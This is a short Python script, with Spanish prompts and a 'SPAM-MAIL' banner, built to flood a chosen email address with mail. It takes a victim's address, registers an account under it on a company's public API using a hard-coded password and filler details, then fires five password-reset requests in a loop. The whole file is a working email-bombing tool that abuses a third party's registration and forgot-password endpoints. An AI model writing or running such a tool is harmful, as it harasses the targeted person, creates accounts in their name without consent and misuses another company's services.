import requests
import colorama
import os
from time import sleep
import json
from colorama import Fore,init
from requests.structures import CaseInsensitiveDict
init()
v = Fore.LIGHTGREEN_EX
re = Fore.LIGHTRED_EX
w = Fore.LIGHTWHITE_EX
c = Fore.LIGHTCYAN_EX
os.system("cls")
def portada():
    print(f"""{re}
  ___________________  _____      _____               _____      _____  .___.____     
 /   _____/\______   \/  _  \    /     \             /     \    /  _  \ |   |    |    
 \_____  \  |     ___/  /_\  \  /  \ /  \   ______  /  \ /  \  /  /_\  \|   |    |    
 /        \ |    |  /    |    \/    Y    \ /_____/ /    Y    \/    |    \   |    |___ 
/_______  / |____|  \____|__  /\____|__  /         \____|__  /\____|__  /___|_______ \        
        """)

    print(f"{v}Herramienta desarrollada por nicolas.$ | Discord:nicolas.$#4882")
 



portada()
correo = str(input(f"{v}Digite el correo a hacer el spam: "))
def opc():
    
    print(f"{w}1.Ir a la herramienta")
    print(f"{w}2.Salir")

opc()
url2 = "https://api.slb.com/api/auth/password/forgot?emailAddress=" + str("{}".format(correo))+"&emailTemplateId={0DA48535-7880-4670-AC80-8164330B907F}"
url1 = 'https://api.slb.com/api/auth/register'
def register():
    _json ={"EmailAddress": "{}".format(correo), "Password" : "Nicolas001?", "RegistrationSource" : "Connect", "FirstName" : "asdasdas", "LastName" : "dasdasd", "Affiliation" : "30", "Company" : "asdasd", "JobTitle" : "asdasdasd", "Region" : "AD", "EmailTemplateId" : "{496E231C-DB8B-40FA-B1A6-414429AF33AE}","RegistrationSource" : "SLBCom"}
    _headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"}
    responseee = requests.post(url1, data=json.dumps(_json), headers= _headers)
    if responseee.status_code == 200:
        print(f"{v}Correo creado con exito")
    else:
        print(f"{re}Correo creado sin exito")
        sleep(3)
        portada()
        opc()
def enviof():
    i=1
    while i <= 5:
        r = requests.post(url2)
        if r.status_code == 200:
          print(f"{v}Correo {i} de 5 enviado con exito")
        else:
          print(f"{re}Correo {i} de 5 enviado sin exito")
        i+=1

    

def opciones():
 op_in = input(str("Digite que quiere hacer: "))

 if op_in == "1":
    necesario_crear_correo = input(str(f"{v}Digite SI, si ya habia utilizado esta herramienta en el correo {correo}, sino, digite NO: "))
    if necesario_crear_correo == "SI": 
      print(f"{c}El correo a hacer spam es {correo}")
      enviof()
      os.system("cls")
      portada()
      opc()
      opciones()
    elif necesario_crear_correo == "NO":
     print(f"{c}El correo a hacer spam es {correo}")
     register()
     enviof()
     os.system("cls")
     portada()
     opc()
     opciones()
 elif op_in == "2":
    print(f"{re}Saliendo...")
    sleep(3)
    exit()
 else:
    print(f"{re}Digite una opcion valida...")
    sleep(3)
    os.system("cls")
    portada()
    opc()
    opciones()

opciones()